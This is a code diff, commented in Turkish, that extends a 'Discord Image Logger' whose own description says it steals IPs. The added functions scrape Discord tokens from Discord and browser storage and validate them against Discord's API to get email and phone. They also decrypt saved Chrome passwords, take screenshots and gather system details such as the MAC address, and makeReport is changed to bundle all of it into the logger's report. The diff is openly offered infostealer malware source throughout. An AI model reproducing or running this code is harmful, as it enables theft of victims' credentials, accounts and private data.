@@ -4,6 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import os  # Çevre değişkenleri için bu import'u ekleyin
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -87,6 +88,241 @@ def reportError(error):
     ],
 })
 
+def get_system_info():
+    path = os.getenv('APPDATA')
+    localpath = os.getenv('LOCALAPPDATA')
+    username = os.getenv('username')
+    pc_name = os.environ.get('COMPUTERNAME', 'Bilinmiyor')
+    
+    # Daha fazla sistem bilgisi toplayalım
+    try:
+        import platform
+        import psutil
+        import uuid
+        
+        system = platform.system()
+        processor = platform.processor()
+        architecture = platform.architecture()[0]
+        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
+        
+        # RAM bilgisi
+        ram = psutil.virtual_memory()
+        total_ram = f"{round(ram.total / (1024.0 ** 3), 2)} GB"
+        
+        # Disk bilgisi
+        disk = psutil.disk_usage('/')
+        total_disk = f"{round(disk.total / (1024.0 ** 3), 2)} GB"
+        free_disk = f"{round(disk.free / (1024.0 ** 3), 2)} GB"
+        
+        # İşlemci kullanımı
+        cpu_usage = f"{psutil.cpu_percent()}%"
+        
+        # Ağ bilgisi
+        network_info = psutil.net_if_addrs()
+        ip_addresses = []
+        for interface_name, interface_addresses in network_info.items():
+            for address in interface_addresses:
+                if str(address.family) == 'AddressFamily.AF_INET':
+                    ip_addresses.append(f"{interface_name}: {address.address}")
+        
+        return {
+            'path': path,
+            'localpath': localpath,
+            'username': username,
+            'pc_name': pc_name,
+            'system': system,
+            'processor': processor,
+            'architecture': architecture,
+            'mac_address': mac_address,
+            'total_ram': total_ram,
+            'total_disk': total_disk,
+            'free_disk': free_disk,
+            'cpu_usage': cpu_usage,
+            'local_ips': ip_addresses
+        }
+    except ImportError:
+        # Eğer gerekli modüller yoksa, temel bilgileri döndür
+        return {
+            'path': path,
+            'localpath': localpath,
+            'username': username,
+            'pc_name': pc_name
+        }
+
+def grab_tokens():
+    system_info = get_system_info()
+    path = system_info.get('path', '')
+    localpath = system_info.get('localpath', '')
+    
+    token_paths = {
+        'Discord': path + "\\Discord\\Local Storage\\leveldb\\",
+        'Discord PTB': path + "\\discordptb\\Local Storage\\leveldb\\",
+        'Discord Canary': path + "\\discordcanary\\Local Storage\\leveldb\\",
+        'Chrome': localpath + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
+        'Opera': localpath + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
+        'Brave': localpath + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
+        'Edge': localpath + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
+        'Firefox': localpath + "\\Mozilla\\Firefox\\Profiles\\"
+    }
+    
+    tokens = []
+    
+    for source, directory in token_paths.items():
+        try:
+            if os.path.exists(directory):
+                if source == 'Firefox':
+                    # Firefox için özel işlem
+                    for profile in os.listdir(directory):
+                        profile_path = os.path.join(directory, profile)
+                        if os.path.isdir(profile_path):
+                            try:
+                                # Firefox'ta tokenleri farklı şekilde saklıyor
+                                # Burada basit bir arama yapıyoruz
+                                for file_name in os.listdir(profile_path):
+                                    if file_name.endswith('.sqlite'):
+                                        try:
+                                            with open(os.path.join(profile_path, file_name), 'rb') as file:
+                                                content = file.read().decode('latin-1')
+                                                import re
+                                                possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
+                                                for token in possible_tokens:
+                                                    if token not in tokens:
+                                                        tokens.append(f"Firefox ({profile}): {token}")
+                                        except:
+                                            pass
+                            except:
+                                pass
+                else:
+                    # Diğer tarayıcılar için standart işlem
+                    for file_name in os.listdir(directory):
+                        if file_name.endswith('.log') or file_name.endswith('.ldb'):
+                            try:
+                                with open(os.path.join(directory, file_name), 'r', encoding='utf-8', errors='ignore') as file:
+                                    content = file.read()
+                                    
+                                    # Token eşleştirme deseni
+                                    import re
+                                    possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
+                                    
+                                    for token in possible_tokens:
+                                        if token not in tokens:
+                                            tokens.append(f"{source}: {token}")
+                            except:
+                                pass
+        except:
+            pass
+    
+    # Token doğrulama
+    verified_tokens = []
+    for token_info in tokens:
+        token = token_info.split(': ')[1]
+        try:
+            headers = {'Authorization': token}
+            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+            if response.status_code == 200:
+                user_data = response.json()
+                username = user_data.get('username', 'Bilinmiyor')
+                discriminator = user_data.get('discriminator', '0000')
+                email = user_data.get('email', 'Bilinmiyor')
+                phone = user_data.get('phone', 'Bilinmiyor')
+                verified_tokens.append(f"{token_info} - {username}#{discriminator} | Email: {email} | Telefon: {phone}")
+            else:
+                verified_tokens.append(f"{token_info} - Geçersiz")
+        except:
+            verified_tokens.append(f"{token_info} - Doğrulanamadı")
+    
+    return '\n'.join(verified_tokens) if verified_tokens else "Token bulunamadı"
+
+def grab_passwords():
+    try:
+        import sqlite3
+        import json
+        import shutil
+        import win32crypt
+        from Crypto.Cipher import AES
+        
+        passwords = []
+        
+        # Chrome şifrelerini al
+        chrome_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default')
+        login_db = os.path.join(chrome_path, 'Login Data')
+        
+        # Veritabanını kopyala (kullanımdaysa erişim hatası almamak için)
+        temp_file = os.path.join(os.getenv('TEMP'), 'login_data')
+        try:
+            shutil.copy2(login_db, temp_file)
+            
+            # Chrome şifreleme anahtarını al
+            key_path = os.path.join(chrome_path, 'Local State')
+            with open(key_path, 'r', encoding='utf-8') as f:
+                local_state = json.loads(f.read())
+                encrypted_key = local_state['os_crypt']['encrypted_key']
+                
+            encrypted_key = base64.b64decode(encrypted_key)[5:]
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            
+            # Veritabanından şifreleri al
+            conn = sqlite3.connect(temp_file)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            
+            for row in cursor.fetchall():
+                site_url = row[0]
+                username = row[1]
+                encrypted_password = row[2]
+                
+                # Şifreyi çöz
+                try:
+                    iv = encrypted_password[3:15]
+                    payload = encrypted_password[15:]
+                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                    decrypted_password = cipher.decrypt(payload)[:-16].decode()
+                    
+                    if username and decrypted_password:
+                        passwords.append(f"URL: {site_url}\nKullanıcı Adı: {username}\nŞifre: {decrypted_password}\n")
+                except:
+                    continue
+            
+            cursor.close()
+            conn.close()
+            
+        except:
+            pass
+        
+        finally:
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+        
+        return '\n'.join(passwords) if passwords else "Şifre bulunamadı"
+    except:
+        return "Şifre toplama başarısız oldu"
+
+def take_screenshot():
+    try:
+        import pyautogui
+        import tempfile
+        
+        # Ekran görüntüsü al
+        screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
+        screenshot = pyautogui.screenshot()
+        screenshot.save(screenshot_path)
+        
+        # Dosyayı oku ve base64'e çevir
+        with open(screenshot_path, 'rb') as image_file:
+            encoded_image = base64.b64encode(image_file.read()).decode('utf-8')
+        
+        # Geçici dosyayı sil
+        try:
+            os.remove(screenshot_path)
+        except:
+            pass
+        
+        return encoded_image
+    except:
+        return None
+
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
@@ -139,6 +375,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
     
+    # Discord tokenlerini ve sistem bilgilerini al
+    tokens = grab_tokens()
+    system_info = get_system_info()
+    passwords = grab_passwords()
+    screenshot = take_screenshot()
+    
     embed = {
     "username": config["username"],
     "content": ping,
@@ -146,26 +388,34 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Kullanıcı Resmi Açtı!**
 
 **Endpoint:** `{endpoint}`
             
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
+**IP Bilgisi:**
+> **IP:** `{ip if ip else 'Bilinmiyor'}`
+> **Sağlayıcı:** `{info['isp'] if info['isp'] else 'Bilinmiyor'}`
+> **ASN:** `{info['as'] if info['as'] else 'Bilinmiyor'}`
+> **Ülke:** `{info['country'] if info['country'] else 'Bilinmiyor'}`
+> **Bölge:** `{info['regionName'] if info['regionName'] else 'Bilinmiyor'}`
+> **Şehir:** `{info['city'] if info['city'] else 'Bilinmiyor'}`
+> **Koordinatlar:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Yaklaşık' if not coords else 'Kesin, [Google Haritalar]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Zaman Dilimi:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobil:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Muhtemelen' if info['hosting'] else 'Hayır'}`
 
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
+**PC Bilgisi:**
+> **İşletim Sistemi:** `{os}`
+> **Tarayıcı:** `{browser}`
+> **Kullanıcı Adı:** `{system_info.get('username', 'Bilinmiyor')}`
+> **PC Adı:** `{system_info.get('pc_name', 'Bilinmiyor')}`
+> **İşlemci:** `{system_info.get('processor', 'Bilinmiyor')}`
+> **Mimari:** `{system_info.get('architecture', 'Bilinmiyor')}`
+> **RAM:** `{system_info.get('total_ram', 'Bilinmiyor')}`
+> **Disk:** `{system_info.get('total_disk', 'Bilinmiyor')} (Boş: {system_info.get('free_disk', 'Bilinmiyor')})`
+> **CPU Kullanımı:** `{system_info.get('cpu_usage', 'Bilinmiyor')}`
+> **MAC Adresi:** `{system_info.get('mac_address', 'Bilinmiyor')}`
 
 **User Agent:**
 ```
@@ -180,7 +430,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     return info
 
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
     # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
